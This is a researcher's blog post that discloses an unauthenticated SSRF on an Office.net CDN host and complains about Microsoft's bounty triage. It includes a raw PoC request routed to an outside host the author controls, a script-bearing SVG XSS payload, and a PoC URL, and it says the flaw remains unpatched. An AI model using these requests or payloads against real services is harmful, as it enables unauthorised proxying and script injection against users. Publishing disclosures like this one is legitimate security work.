---
title: "Unauthenticated SSRF in Office.net"
date: 2024-10-28T20:20:19-04:00
draft: true
tags: ["notes", "microsoft", "ssrf", "xss"]
---

In late September I reported an unauthenticated SSRF I'd found on Office.net to MSRC, only to receive a response that said I had included no reproduction steps, and therefore the report was invalid and would be closed. 

Obviously, the report had reproduction steps. So I replied, directing them to *the report* (which included reproduction steps), and was met with the same response. The report was closed, and I was pretty miffed. 

It sucks, but it's actually not the first time it's happened to me, in similar form, so I filed it back into my pile of orphaned MS bugs and ended up looking back at it again a week later. 

*Once, I had a report for a bug in Teams get automatically closed, receiving a response about it not meeting criteria for bugs in Bing. After asking what the fuck Bing had to do with anything I got:*
> "There seems like there may have been a mix-up on our end. You are correct, this case does not deal with BingAI" 

*No joke. They later paid out $5,000 for this disclosure.*

### SSRF Details

The SSRF wasn't complex, a URL path parameter caused an HTTP request to arbitrary domains, but it was restricted to image files and responded with 405's and a `Content-Type not allowed` response body for anything but. While it could only retrieve image contents.

Here's a poc request:
```
GET /localh0st.run/test?testParam=test HTTP/1.1
Host: media.akamai.odsp.cdn.office.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
TEST-HEADER: This is a test header through an SSRF
```

and what `localh0st.run` receives:
```
GET /test?testParam=test HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
TEST-HEADER: This is a test header through an SSRF
Pragma: akamai-x-cache-remote-on
X-Akamai-CONFIG-LOG-DETAIL: true
TE:  chunked;q=1.0
Connection: TE
Accept-Encoding: gzip
Akamai-Origin-Hop: 1
Via: 1.1 akamai.net(ghost) (AkamaiGHost)
X-Forwarded-For: 6x.xx.xx.xx7
True-Client-IP: 6x.xx.xx.xx7
Host: localh0st.run
Cache-Control: max-age=86400
Connection: keep-alive
```

Not a crazy bug, but it allows proxying of GET requests, including headers and parameters, to arbitrary resources. Note the included `TEST-HEADER: This is a test header through an SSRF` header.

### SSRF --> XSS

I went back a week or two later to resubmit it, and decided to take a second look. This time I fuzzed for accepted file extensions and found SVGs were returned successfully. I made a quick XSS SVG PoC and boom, Reflected XSS on Office.net through an externally hosted SVG!

classic XSS svg:
```
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">  
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>  
<script type="text/javascript">  
alert(document.location);  
</script>  
</svg>
```

PoC URL:

`https://media.akamai.odsp.cdn.office.net/localh0st.run/tests/test.svg`

![XSS-1](<screens/Pasted image 20241001210323.png>)

### Bounty? You wish!

Sadly, even though this was an unauthenticated SSRF, leading to XSS via an externally hosted SVG, that additionally allowed both arbitrary URL parameters *and* arbitrary headers sent to external and internal resources, Microsoft said the following:

![alt text](<screens/Pasted image 20241028100744.png>)

I feel like the "as presented" wording is a bit of a "gotcha" (it's XSS, come on), but MS has very strict categorization of issues, defined here: https://www.microsoft.com/en-us/msrc/olsbugbar

This XSS apparently only meets the "General - Moderate" classification: 
> XSS triggering on public pages that does not disclose private data or allow the compromise of an authenticated session

Interestingly however, the SSRF meets the "Confidential - Important" criteria:
> SSRF vulnerability sending requests to sensitive internal endpoints that leaks sensitive information or performs a sensitive action 

Microsoft, however, does not agree.

### Status: Complete

It took a bit of digging through MS documentation, [but a disclosure status of **Complete**, states](https://msrc.microsoft.com/blog/2023/07/what-to-expect-when-reporting-vulnerabilities-to-microsoft/) "Congratulations! You will now be free to discuss your findings publicly if you wish."

So, while this issues remains actively vulnerable, Microsoft has been made aware, they decided it's not really an issue, and given their blessing for public disclosure.

I don't get it either, but it's public now so have fun I guess.